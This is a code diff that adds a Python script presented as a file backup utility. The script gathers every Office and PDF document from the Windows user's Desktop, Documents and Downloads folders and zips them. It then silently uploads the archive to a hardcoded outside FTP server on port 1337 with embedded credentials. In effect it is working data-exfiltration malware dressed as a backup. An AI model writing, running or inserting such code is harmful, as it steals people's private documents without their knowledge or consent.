@@ -1,0 +1,60 @@
+import os
+import shutil
+import zipfile
+from ftplib import FTP
+from pathlib import Path
+
+extensions = ['.docx', '.xlsx', '.pptx', '.pdf']
+
+user_profile = Path(os.environ.get('USERPROFILE', ''))
+desktop = user_profile / 'Desktop'
+documents = user_profile / 'Documents'
+downloads = user_profile / 'Downloads'
+
+temp_dir = user_profile / 'AppData' / 'Local' / 'Temp' / 'files'
+
+os.makedirs(temp_dir, exist_ok=True)
+
+def collect_files_from_directory(directory):
+    collected_files = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in extensions):
+                collected_files.append(os.path.join(root, file))
+    return collected_files
+
+files_to_backup = []
+files_to_backup.extend(collect_files_from_directory(desktop))
+files_to_backup.extend(collect_files_from_directory(documents))
+files_to_backup.extend(collect_files_from_directory(downloads))
+
+for file in files_to_backup:
+    shutil.copy(file, temp_dir)
+
+zip_path = temp_dir / 'temp.zip'
+with zipfile.ZipFile(zip_path, 'w') as zipf:
+    for file in os.listdir(temp_dir):
+        file_path = temp_dir / file
+        if file_path.is_file():
+            zipf.write(file_path, os.path.basename(file_path))
+
+ftp_server = '3.78.244.11'
+ftp_port = 1337
+ftp_user = 'Heimerdinger'
+ftp_password = '4M83554M3D4rD4'
+
+def upload_to_ftp(zip_path, server, port, user, password):
+    try:
+        ftp = FTP()
+        ftp.connect(server, port)
+        ftp.login(user, password)
+        with open(zip_path, 'rb') as f:
+            ftp.storbinary(f'STOR temp.zip', f)
+        ftp.quit()
+        print(f"Successfully uploaded {zip_path} to FTP server")
+    except Exception as e:
+        print(f"FTP upload failed: {e}")
+
+upload_to_ftp(zip_path, ftp_server, ftp_port, ftp_user, ftp_password)
+
+print("Backup and FTP upload process completed.")
